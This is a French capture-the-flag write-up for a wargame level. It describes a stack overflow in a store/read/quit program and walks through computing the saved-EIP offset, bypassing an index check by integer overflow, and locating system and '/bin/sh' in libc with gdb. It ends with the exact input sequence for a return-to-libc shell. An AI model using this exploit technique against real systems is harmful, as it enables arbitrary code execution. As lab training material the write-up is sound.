Ce programme nous permet d'entrer une command de {store;read;quit}, ce qui va nous permettre d'ecrire ou de lire un buffer.

Il n'y a pas de bounds check donc on peut theoriquement overwrite la stack, y compris le save de EIP.

argv et env sont reset a 0 au debut du programme, donc on ne pourra pas y stoquer un shellcode. Au vu du fonctionnement du programme, le mieux serait de faire un return-to-libc.

## Trouver le save de EIP
```
push %ebp -> 4 bytes
push %edi -> 4 bytes
push %esi -> 4 bytes
push %ebx -> 4 bytes
and 0xfffffff0,%esp -> alignement de esp a 16 bytes. Avec gdb on peut voir que esp = 0xffffd70c, donc on enleve 0xc = 12 bytes
sub 464,%esp -> 464 bytes
...
lea 36(%esp),%ebx -> on charge l'adresse pointee par esp + 36 bytes pour le buffer
```

L'addresse de EIP relative au buffer est: \
4 * 4 + 12 + 464 - 36 = 456 bytes

## Trouver l'index
Pour avoir l'index on divise par la taille d'un int: 456 / 4 = 114 \
114 est divisible par 3, donc on ne pourra pas utiliser cet index directement.

L'index est multiplie par 4 en faisant un shl de 2 juste avant le mov, donc le check % 3 peut etre contourne en jouant avec l'un des 2 haut bits car ils seront jetes apres, ce qui rendra l'index non divisible par 3.

```
Index de base: 0b10000000000000000000000000000000 = 2147483648
Index final: 2147483648 + 114 = 2147483762
```

## Preparer le return2libc
On va chercher l'adresse d'une chaine de caractere "/bin/sh" et l'adresse de la fonction system dans l'executable ou l'une des libs qui sont chargees.
```
(gdb) b main
(gdb) run
Starting program: /home/users/level07/level07

Breakpoint 1, 0x08048729 in main ()
(gdb) info proc map
process 1746
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
 ...
    0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
    0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
    0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
    0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
 ...
(gdb) find 0xf7e2c000,0xf7fd0000,"/bin/sh"
0xf7f897ec
1 pattern found.
(gdb) info functions system
All functions matching regular expression "system":

Non-debugging symbols:
0xf7e6aed0  __libc_system
0xf7e6aed0  system
0xf7f48a50  svcerr_systemerr
```

## Final
On ecrit a l'index 2147483762 l'adresse de la fonction system (0xf7e6aed0 = 4159090384), et a l'adresse 116 l'argument pour system (0xf7f897ec = 4160264172).

```
store
4159090384
2147483762
store
4160264172
116
quit
```
